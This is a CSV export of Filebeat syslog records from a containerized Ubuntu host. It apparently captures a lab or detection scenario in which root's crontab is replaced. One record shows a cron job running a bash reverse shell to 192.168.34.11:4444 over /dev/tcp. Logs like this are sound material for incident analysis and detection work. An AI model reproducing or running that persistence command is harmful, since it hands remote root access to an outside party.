@timestamp,@version,agent.ephemeral_id,agent.id,agent.name,agent.type,agent.version,ecs.version,event.original,host.architecture,host.containerized,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.platform,host.os.type,host.os.version,log.file.path,log.offset,log.syslog.facility.code,log.syslog.facility.name,log.syslog.severity.code,log.syslog.severity.name,message,received_at,received_from,syslog_hostname,syslog_message,syslog_pid,syslog_program,syslog_timestamp,tags,type,_id,_index,_score
"Oct 25, 2022 @ 13:56:01.000",1,0083a7ee-5fe9-40b4-b85c-918b4a4d3ae5,55d7d954-35f6-4608-90d4-960079eae3cf,92320f859469,filebeat,8.3.3,8.0.0,Oct 25 05:56:01 92320f859469 CRON[282]: (root) CMD (/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.34.11/4444 0>&1'),x86_64,TRUE,92320f859469,d7fdfbd620d3d97fa277cdc0635761eb,"192.168.33.12, 192.168.34.12","02:42:c0:a8:21:0c, 02:42:c0:a8:22:0c",92320f859469,focal,debian,4.15.0-58-generic,Ubuntu,ubuntu,linux,20.04.5 LTS (Focal Fossa),/var/log/syslog,789,1,user-level,5,notice,Oct 25 05:56:01 92320f859469 CRON[282]: (root) CMD (/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.34.11/4444 0>&1'),"Oct 25, 2022 @ 13:56:07.510","{""hostname"":""92320f859469"",""os"":{""kernel"":""4.15.0-58-generic"",""codename"":""focal"",""name"":""Ubuntu"",""type"":""linux"",""family"":""debian"",""version"":""20.04.5 LTS (Focal Fossa)"",""platform"":""ubuntu""},""ip"":[""192.168.33.12"",""192.168.34.12""],""containerized"":true,""name"":""92320f859469"",""id"":""d7fdfbd620d3d97fa277cdc0635761eb"",""mac"":[""02:42:c0:a8:21:0c"",""02:42:c0:a8:22:0c""],""architecture"":""x86_64""}",92320f859469,(root) CMD (/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.34.11/4444 0>&1'),282,CRON,1/10/2025 05:56,beats_input_codec_plain_applied,syslog,IV62DYQBkgYblV-2Z5Q0,filebeat-2022.10.25,-
"Oct 25, 2022 @ 13:56:01.000",1,0083a7ee-5fe9-40b4-b85c-918b4a4d3ae5,55d7d954-35f6-4608-90d4-960079eae3cf,92320f859469,filebeat,8.3.3,8.0.0,"Oct 25 05:56:01 92320f859469 CRON[281]: (CRON) info (No MTA installed, discarding output)",x86_64,TRUE,92320f859469,d7fdfbd620d3d97fa277cdc0635761eb,"192.168.33.12, 192.168.34.12","02:42:c0:a8:21:0c, 02:42:c0:a8:22:0c",92320f859469,focal,debian,4.15.0-58-generic,Ubuntu,ubuntu,linux,20.04.5 LTS (Focal Fossa),/var/log/syslog,906,1,user-level,5,notice,"Oct 25 05:56:01 92320f859469 CRON[281]: (CRON) info (No MTA installed, discarding output)","Oct 25, 2022 @ 13:56:07.510","{""hostname"":""92320f859469"",""os"":{""kernel"":""4.15.0-58-generic"",""codename"":""focal"",""name"":""Ubuntu"",""type"":""linux"",""family"":""debian"",""version"":""20.04.5 LTS (Focal Fossa)"",""platform"":""ubuntu""},""ip"":[""192.168.33.12"",""192.168.34.12""],""containerized"":true,""name"":""92320f859469"",""id"":""d7fdfbd620d3d97fa277cdc0635761eb"",""mac"":[""02:42:c0:a8:21:0c"",""02:42:c0:a8:22:0c""],""architecture"":""x86_64""}",92320f859469,"(CRON) info (No MTA installed, discarding output)",281,CRON,1/10/2025 05:56,beats_input_codec_plain_applied,syslog,IF62DYQBkgYblV-2Z5Q0,filebeat-2022.10.25,-
"Oct 25, 2022 @ 13:55:44.000",1,0083a7ee-5fe9-40b4-b85c-918b4a4d3ae5,55d7d954-35f6-4608-90d4-960079eae3cf,92320f859469,filebeat,8.3.3,8.0.0,Oct 25 05:55:44 92320f859469 crontab[274]: (root) REPLACE (root),x86_64,TRUE,92320f859469,d7fdfbd620d3d97fa277cdc0635761eb,"192.168.33.12, 192.168.34.12","02:42:c0:a8:21:0c, 02:42:c0:a8:22:0c",92320f859469,focal,debian,4.15.0-58-generic,Ubuntu,ubuntu,linux,20.04.5 LTS (Focal Fossa),/var/log/syslog,515,1,user-level,5,notice,Oct 25 05:55:44 92320f859469 crontab[274]: (root) REPLACE (root),"Oct 25, 2022 @ 13:55:52.503","{""hostname"":""92320f859469"",""os"":{""kernel"":""4.15.0-58-generic"",""codename"":""focal"",""name"":""Ubuntu"",""type"":""linux"",""family"":""debian"",""version"":""20.04.5 LTS (Focal Fossa)"",""platform"":""ubuntu""},""ip"":[""192.168.33.12"",""192.168.34.12""],""containerized"":true,""name"":""92320f859469"",""id"":""d7fdfbd620d3d97fa277cdc0635761eb"",""mac"":[""02:42:c0:a8:21:0c"",""02:42:c0:a8:22:0c""],""architecture"":""x86_64""}",92320f859469,(root) REPLACE (root),274,crontab,1/10/2025 05:55,beats_input_codec_plain_applied,syslog,zF62DYQBkgYblV-2MpNQ,filebeat-2022.10.25,-
"Oct 25, 2022 @ 13:55:44.000",1,0083a7ee-5fe9-40b4-b85c-918b4a4d3ae5,55d7d954-35f6-4608-90d4-960079eae3cf,92320f859469,filebeat,8.3.3,8.0.0,Oct 25 05:55:44 92320f859469 cron[280]: (CRON) INFO (Running @reboot jobs),x86_64,TRUE,92320f859469,d7fdfbd620d3d97fa277cdc0635761eb,"192.168.33.12, 192.168.34.12","02:42:c0:a8:21:0c, 02:42:c0:a8:22:0c",92320f859469,focal,debian,4.15.0-58-generic,Ubuntu,ubuntu,linux,20.04.5 LTS (Focal Fossa),/var/log/syslog,714,1,user-level,5,notice,Oct 25 05:55:44 92320f859469 cron[280]: (CRON) INFO (Running @reboot jobs),"Oct 25, 2022 @ 13:55:52.503","{""hostname"":""92320f859469"",""os"":{""kernel"":""4.15.0-58-generic"",""codename"":""focal"",""name"":""Ubuntu"",""type"":""linux"",""family"":""debian"",""version"":""20.04.5 LTS (Focal Fossa)"",""platform"":""ubuntu""},""ip"":[""192.168.33.12"",""192.168.34.12""],""containerized"":true,""name"":""92320f859469"",""id"":""d7fdfbd620d3d97fa277cdc0635761eb"",""mac"":[""02:42:c0:a8:21:0c"",""02:42:c0:a8:22:0c""],""architecture"":""x86_64""}",92320f859469,(CRON) INFO (Running @reboot jobs),280,cron,1/10/2025 05:55,beats_input_codec_plain_applied,syslog,2162DYQBkgYblV-2MpNp,filebeat-2022.10.25,-
"Oct 25, 2022 @ 13:55:44.000",1,0083a7ee-5fe9-40b4-b85c-918b4a4d3ae5,55d7d954-35f6-4608-90d4-960079eae3cf,92320f859469,filebeat,8.3.3,8.0.0,Oct 25 05:55:44 92320f859469 cron[280]: (CRON) STARTUP (fork ok),x86_64,TRUE,92320f859469,d7fdfbd620d3d97fa277cdc0635761eb,"192.168.33.12, 192.168.34.12","02:42:c0:a8:21:0c, 02:42:c0:a8:22:0c",92320f859469,focal,debian,4.15.0-58-generic,Ubuntu,ubuntu,linux,20.04.5 LTS (Focal Fossa),/var/log/syslog,649,1,user-level,5,notice,Oct 25 05:55:44 92320f859469 cron[280]: (CRON) STARTUP (fork ok),"Oct 25, 2022 @ 13:55:52.503","{""hostname"":""92320f859469"",""os"":{""kernel"":""4.15.0-58-generic"",""codename"":""focal"",""name"":""Ubuntu"",""type"":""linux"",""family"":""debian"",""version"":""20.04.5 LTS (Focal Fossa)"",""platform"":""ubuntu""},""ip"":[""192.168.33.12"",""192.168.34.12""],""containerized"":true,""name"":""92320f859469"",""id"":""d7fdfbd620d3d97fa277cdc0635761eb"",""mac"":[""02:42:c0:a8:21:0c"",""02:42:c0:a8:22:0c""],""architecture"":""x86_64""}",92320f859469,(CRON) STARTUP (fork ok),280,cron,1/10/2025 05:55,beats_input_codec_plain_applied,syslog,0V62DYQBkgYblV-2MpNQ,filebeat-2022.10.25,-
"Oct 25, 2022 @ 13:55:44.000",1,0083a7ee-5fe9-40b4-b85c-918b4a4d3ae5,55d7d954-35f6-4608-90d4-960079eae3cf,92320f859469,filebeat,8.3.3,8.0.0,Oct 25 05:55:44 92320f859469 cron[279]: (CRON) INFO (pidfile fd = 4),x86_64,TRUE,92320f859469,d7fdfbd620d3d97fa277cdc0635761eb,"192.168.33.12, 192.168.34.12","02:42:c0:a8:21:0c, 02:42:c0:a8:22:0c",92320f859469,focal,debian,4.15.0-58-generic,Ubuntu,ubuntu,linux,20.04.5 LTS (Focal Fossa),/var/log/syslog,580,1,user-level,5,notice,Oct 25 05:55:44 92320f859469 cron[279]: (CRON) INFO (pidfile fd = 4),"Oct 25, 2022 @ 13:55:52.503","{""hostname"":""92320f859469"",""os"":{""kernel"":""4.15.0-58-generic"",""codename"":""focal"",""name"":""Ubuntu"",""type"":""linux"",""family"":""debian"",""version"":""20.04.5 LTS (Focal Fossa)"",""platform"":""ubuntu""},""ip"":[""192.168.33.12"",""192.168.34.12""],""containerized"":true,""name"":""92320f859469"",""id"":""d7fdfbd620d3d97fa277cdc0635761eb"",""mac"":[""02:42:c0:a8:21:0c"",""02:42:c0:a8:22:0c""],""architecture"":""x86_64""}",92320f859469,(CRON) INFO (pidfile fd = 4),279,cron,1/10/2025 05:55,beats_input_codec_plain_applied,syslog,1l62DYQBkgYblV-2MpNR,filebeat-2022.10.25,-
